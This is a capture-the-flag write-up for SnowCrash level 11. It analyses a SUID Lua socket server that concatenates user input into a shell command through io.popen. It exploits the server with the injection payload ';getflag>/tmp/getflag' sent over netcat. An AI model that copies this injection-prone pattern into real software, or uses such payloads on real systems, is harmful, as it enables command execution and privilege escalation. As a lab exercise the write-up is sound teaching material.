# LEVEL11
# LEVEL11

## 1. Inspect The Home Directory
## 1. Inspect The Home Directory

```bash
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

The Lua script `level11.pl` is owned by `flag11`, with the SUID bit set `-rwsr-sr-x`, meaning it will run with the privileges of `flag11`.

Program breakdown:
-A socket server binds to `127.0.0.1` on port `5151`.
-When a client connects, it prompts for a password.
-The password is passed to the `hash()` function, which executes `sha1sum` through `io.popen()` via the command `echo "..pass.." | sha1sum`.
-The resulting SHA1 hash is compared to `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`.
-A success or failure message is sent back to the client.

The use of `io.popen("echo "..pass.." | sha1sum")` is unsafe. If the password contains shell metacharacters, arbitrary commands can be executed.

## 2. Communication With The Program

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: test
Erf nope..
```

To communicate with the program, a client must connect to the server using `nc` (netcat) or any TCP client.

**Explanation:**
>- `nc`				: netcat, a tool to read and write data across networks.
>- `locahost`		: address of the local machine.
>- `5151`			: port to listen to.


## 3. Misleading Approach

A seemingly good approach is to try reversing the hash:
```
f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
```

Using an online SHA1 reverse tool, such as [Dcode SHA1 decryptor](https://www.dcode.fr/hash-sha1), the hash can be reversed to:
```
NotSoEasy
```

However, submitting this password to the server does not work:
```bash
level11@SnowCrash:~$ nc localhost 5151
Password: NotSoEasy
Erf nope..
```

Therefore, a different method must be employed to retrieve the token.

**Explanation:**
>- `nc`				: netcat, a tool to read and write data across networks.
>- `locahost`		: address of the local machine.
>- `5151`			: port to listen to.

## 4. Exploiting Shell Injection

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: ;getflag>/tmp/getflag
Erf nope..
level11@SnowCrash:~$ cat /tmp/getflag
Check flag.Here is your token : XXX
```

The `io.popen("echo "..pass.." | sha1sum")` call executes a shell command that concatenates the password into the `echo` command. Allowing injection of arbitrary commands.

By proving the shell command `;getflag>/tmp/getflag` as password, the shell executes the `getflag` command with the privileges of the SUID binary (i.e., as `flag11`) and redirects the output to `/tmp/getflag`.

**Explanation of the injection:**
>- `;`					: ends the `echo` command in the shell and allows `getflag` to run.
>- `getflag`			: executes the privileged command.
>- `>/tmp/getflag`				: redirects the output of `getflag` to `/tmp/getflag`.

**Explanation:**
>- `nc`				: netcat, a tool to read and write data across networks.
>- `localhost`		: address of the local machine.
>- `5151`			: port to listen to.
>- `;`				: separates commands, ending the current one and starting a new one.
>- `getflag`		: command to execute to get the flag.
>- `> FILE`			: redirects the standard output of a command into `FILE`